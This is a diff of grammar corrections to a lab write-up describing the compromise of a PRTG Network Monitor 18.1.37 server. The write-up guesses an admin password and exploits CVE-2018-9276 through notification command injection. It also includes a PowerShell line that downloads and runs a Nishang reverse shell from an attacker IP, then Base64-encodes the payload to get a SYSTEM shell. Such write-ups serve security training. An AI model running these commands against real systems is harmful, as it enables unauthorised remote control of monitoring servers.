@@ -65,16 +65,16 @@ It contains a username and a password:
 
 ## Checking HTTP (Port 80)
 
-The webpage is the monitoring system **PRTG Network Monitor** in the version 18.1.37 and logging in with default credentials and the gathered credentials does not work.
+The webpage is the monitoring system **PRTG Network Monitor** in the version 18.1.37 and logging in with default credentials and the gathered credentials do not work.
 
 As the file is from 2019 lets increment the year by one so the password looks like this:
 > PrTg@dmin2019
 
-And we are logged in as the user prtgadmin.
+And we are logged in as the user _prtgadmin_.
 
 ### Exploiting PRTG
 
-After searching for exploits we find **CVE-2018-9276** that exploits and OS command injection vulnerability by sending malformed parameters in sensor or notification management scenarios.
+After searching for exploits we find **CVE-2018-9276** that exploits an OS command injection vulnerability by sending malformed parameters in sensor or notification management scenarios.
 
 We can setup notifications on _Setup_ --> _Notifications_. Clicking on one the notifications and then _Settings_ there is an option to **Execute Program**.
 
@@ -87,7 +87,7 @@ test | ping -n 1 10.10.13.112
 
 Listening on ICMP packets with tcpdump and then sending the test notification, we will get a ping response. This validates that we have command execution and the next step is a reverse shell.
 
-We will use the reverse shell the from Nishang _Invoke-PowerShellTcp.ps1_ that I upload on a webserver as _shell.ps1_.
+We will use the reverse shell from Nishang _Invoke-PowerShellTcp.ps1_ that I upload on a webserver as _shell.ps1_.
 
 Start webserver and listen on port 80:
 ```markdown
@@ -100,7 +100,7 @@ On PRTG we want to execute this command to download the file and execute it:
 test | IEX(New-Object Net.WebClient).downloadString("http://10.10.13.112:8000/shell.ps1")
 ```
 
-Unfortunaly this does not give us a shell. So we will eliminate bad characters by Base64 encoding the shell:
+Unfortunaly this does not give us a shell. So we will eliminate bad characters by Base64 encoding the shell script:
 ```markdown
 cat shell.ps1 | iconv -t UTF-16LE | base64 -w0
 ```
@@ -110,4 +110,4 @@ Copy the long Base64 string and input it into the parameter and send the notific
 test | powershell -enc [base64 shell.ps1]
 ```
 
-This time we get a reverse shell as _NT Authority\SySTEM_ and can read root.txt!
+This time we get a reverse shell as _NT Authority\SYSTEM_ and can read root.txt!
